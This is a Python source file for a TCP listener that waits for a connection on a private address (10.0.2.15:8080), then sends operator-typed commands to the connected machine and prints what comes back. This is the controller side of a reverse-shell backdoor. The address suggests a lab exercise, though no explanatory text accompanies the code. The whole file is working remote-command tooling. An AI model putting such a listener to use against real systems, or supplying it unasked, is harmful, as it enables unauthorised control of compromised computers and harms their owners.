import socket

class SocketListener:
    def __init__(self, ip, port):
        try:
            self.my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.my_listener.bind((ip, port))
            self.my_listener.listen(0)
            print("Listening...")
            self.my_connection, my_address = self.my_listener.accept()
            print("Connection established with:", my_address)
        except Exception as e:
            print(f"Error during connection setup: {e}")
            self.my_connection = None

    def command_execution(self, command_input):
        try:
            # Encoding the command input to bytes before sending
            self.my_connection.send(command_input.encode())
            # Receiving the command output and decoding it from bytes to string
            command_output = self.my_connection.recv(1024).decode()
            return command_output
        except Exception as e:
            print(f"Error while executing command: {e}")
            return None

    def start_listener(self):
        try:
            while True:
                command_input = input("Enter command: ")  # Using input() for Python 3.x
                if command_input.lower() == 'exit':
                    print("Closing connection...")
                    self.my_connection.close()
                    break
                command_output = self.command_execution(command_input)
                if command_output:
                    print(f"Output: {command_output}")
        except KeyboardInterrupt:
            print("\nListener stopped.")
            self.my_connection.close()
        except Exception as e:
            print(f"Error in listener loop: {e}")
            self.my_connection.close()


if __name__ == "__main__":
    my_socket_listener = SocketListener("10.0.2.15", 8080)
    if my_socket_listener.my_connection:
        my_socket_listener.start_listener()
